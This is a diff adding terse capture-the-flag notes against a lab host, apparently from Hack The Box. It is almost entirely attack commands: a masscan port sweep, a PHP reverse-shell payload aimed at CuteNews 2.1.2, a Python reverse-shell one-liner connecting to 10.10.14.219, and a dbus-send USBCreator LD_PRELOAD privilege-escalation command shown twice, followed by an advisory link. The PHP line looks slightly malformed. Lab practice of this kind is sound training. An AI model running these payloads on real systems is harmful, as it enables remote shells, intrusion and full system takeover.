@@ -1,0 +1,17 @@
+masscan -p 1-65535 10.10.10.206 -e tun0 --rate=1000
+ssh
+apache?web server
+------------------------------
+
+Cute News Version 2.1.2
+
+'<?php $sock=fsockopen("10.10.14.219",4321);exec("/bin/sh -i <&3 >&3 2>&3");>'
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.219",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+dbus-send --print-reply --system --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda dict:string:string:DISPLAY,"foo",XAUTHORITY,"foo",LD_PRELOAD,"/tmp/test.so" method return sender=:1.4364 -> dest=:1.7427 reply_serial=2
+
+
+dbus-send --print-reply --system --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda dict:string:string:DISPLAY,"foo",XAUTHORITY,"foo",LD_PRELOAD,"/tmp/test.so" method return sender=:1.4364 -> dest=:1.7427 reply_serial=2
+
+https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
